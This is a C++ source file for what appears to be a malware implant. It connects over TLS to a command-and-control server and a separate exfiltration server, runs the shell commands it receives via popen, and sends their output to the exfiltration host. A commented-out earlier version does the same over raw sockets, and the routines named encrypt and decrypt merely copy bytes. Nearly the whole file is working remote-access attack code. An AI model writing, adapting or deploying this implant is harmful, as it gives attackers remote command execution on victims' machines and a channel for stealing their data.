// See 

#include <cstdlib>
#include <cstddef>
#include <cstdio>
#include <iostream>
#include <sstream>
#include <string>
#include <vector>
#include <memory>
#include <array>

#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>
#include <openssl/ssl.h>
#include <openssl/err.h>


std::string decrypt(char* buf, size_t bytes) {
    buf[bytes] = '\0';
    std::string message(buf);
    return message;
}

std::vector<std::byte> encrypt(std::string s) {
    std::vector<std::byte> e;

    for(auto& c : s) {
        e.push_back(static_cast<std::byte>(c));
    }

    return e;
}

std::string exec(const char* cmd) {
    std::array<char, 128> buffer;
    std::string r;

    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);

    if(!pipe) { return "ERR, pipe failed"; }

    while(fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        r += buffer.data();
    }
    return r;
}

void handleMessage(const std::string& msg, SSL* ssl) {
    std::istringstream iss(msg);
    std::string keyword, id, data;
    if (!(iss >> keyword) || !(iss >> id)) return;
    std::getline(iss, data);

    std::string response;

    if (keyword == "HELO") {
        response = "HELLO " + id;
    } else if (keyword == "EXIT") {
        throw 1;
    } else if(keyword == "CMD"){
        std::string command = data;
        std::string cmd_output = exec(command.c_str());
        response = cmd_output.empty() ? "CMD OK" : cmd_output;
    }
    else {
        response = "ERR " + id;
    }

    SSL_write(ssl, response.c_str(), response.size());
}

SSL_CTX* createSSLContext() {
    SSL_CTX* ctx = SSL_CTX_new(TLS_client_method());
    if (!ctx) {
        ERR_print_errors_fp(stderr);
        return nullptr;
    }

    // Load the CA cert to verify the server
    if (SSL_CTX_load_verify_locations(ctx, "/tmp/index.html", nullptr) != 1) {
        ERR_print_errors_fp(stderr);
        SSL_CTX_free(ctx);
        return nullptr;
    }

    SSL_CTX_set_verify(ctx, SSL_VERIFY_PEER, nullptr);
    return ctx;
}

SSL* connectTLS(SSL_CTX* ctx, int sock, const char* hostname) {
    SSL* ssl = SSL_new(ctx);
    SSL_set_fd(ssl, sock);
    SSL_set_tlsext_host_name(ssl, hostname); // SNI

    if (SSL_connect(ssl) != 1) {
        ERR_print_errors_fp(stderr);
        SSL_free(ssl);
        return nullptr;
    }
    return ssl;
}

int makeSocket(const char* ip, int port) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;

    sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &addr.sin_addr);

    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        close(sock);
        return -1;
    }
    return sock;
}


// void handleMessage(const std::string& msg, int sock) {
//     std::istringstream iss(msg);
//     std::string keyword, id, data;
//     if(!(iss >> keyword) || !(iss >> id)) {
//         // Failure state
//         return;
//     }
//     std::getline(iss, data);

//     if(keyword == "HELO") {
//         std::string s = std::string("HELLO ") + id;
//         std::vector<std::byte> e = encrypt(s);
//         send(sock, e.data(), e.size(), 0);
//     } else if(keyword == "EXIT") {
//         // throw
//         throw 1;
//     } else if(keyword == "CMD"){
//         std::string command = data;
//         std::string s = exec(command.c_str());
//         std::vector<std::byte> e = encrypt(s);
//         send(sock, e.data(), e.size(), 0);
//     } else {
//         // ERR
//         std::string s = std::string("ERR ") + id;
//         std::vector<std::byte> e = encrypt(s);
//         send(sock, e.data(), e.size(), 0);
//     }
// }

// int main(int argc, char* argv[]) {
//     // Setup c2 server connection
//     int c2clientSocket = socket(AF_INET, SOCK_STREAM, 0);
//     if(c2clientSocket < 0) {
//         return 1;
//     }

//     sockaddr_in c2ServerAddress{};
//     c2ServerAddress.sin_family = AF_INET;
//     c2ServerAddress.sin_port = htons(C2_PORT);
//     inet_pton(AF_INET, C2_IP, &c2ServerAddress.sin_addr);

//     if(connect(c2clientSocket, (struct sockaddr*)&c2ServerAddress, sizeof(c2ServerAddress)) < 0) {
//         close(c2clientSocket);
//         return 1;
//     }

//     // Setup exfil server connection
//     int exfilClientSocket = socket(AF_INET, SOCK_STREAM, 0);
//     if(exfilClientSocket < 0) {
//         close(c2clientSocket);
//         return 1;
//     }

//     sockaddr_in exfilServerAddress{};
//     exfilServerAddress.sin_family = AF_INET;
//     exfilServerAddress.sin_port = htons(EXFIL_PORT);
//     inet_pton(AF_INET, EXFIL_IP, &exfilServerAddress.sin_addr);

//     if(connect(exfilClientSocket, (struct sockaddr*)&exfilServerAddress, sizeof(exfilServerAddress)) < 0) {
//         close(c2clientSocket);
//         close(exfilClientSocket);
//         return 1;
//     }

//     char buf[1024];
//     while(true) {
//         ssize_t bytesReceived = recv(c2clientSocket, buf, sizeof(buf) - 1, 0);

//         if(bytesReceived == -1) {
//             break;
//         }
        
//         try {
//             handleMessage(decrypt(buf, bytesReceived), exfilClientSocket);
//         } catch (...) {
//             break;
//         }
//     }

//     close(c2clientSocket);
//     close(exfilClientSocket);

//     return EXIT_SUCCESS;
// }


int main() {
    SSL_CTX* ctx = createSSLContext();
    if (!ctx) return 1;

    // Connect to server 1
    int sock1 = makeSocket(C2_IP, C2_PORT);
    if (sock1 < 0) { SSL_CTX_free(ctx); return 1; }
    SSL* ssl1 = connectTLS(ctx, sock1, C2_IP);
    if (!ssl1) { close(sock1); SSL_CTX_free(ctx); return 1; }

    // Connect to server 2
    int sock2 = makeSocket(EXFIL_IP, EXFIL_PORT);
    if (sock2 < 0) { SSL_free(ssl1); close(sock1); SSL_CTX_free(ctx); return 1; }
    SSL* ssl2 = connectTLS(ctx, sock2, EXFIL_IP);
    if (!ssl2) { close(sock2); SSL_free(ssl1); close(sock1); SSL_CTX_free(ctx); return 1; }

    char buf[1024];
    while (true) {
        int bytes = SSL_read(ssl1, buf, sizeof(buf) - 1);
        if (bytes <= 0) break;

        try {
            handleMessage(decrypt(buf, bytes), ssl2);
        } catch (...) {
            break;
        }
    }

    SSL_shutdown(ssl1); SSL_free(ssl1); close(sock1);
    SSL_shutdown(ssl2); SSL_free(ssl2); close(sock2);
    SSL_CTX_free(ctx);

    return EXIT_SUCCESS;
}
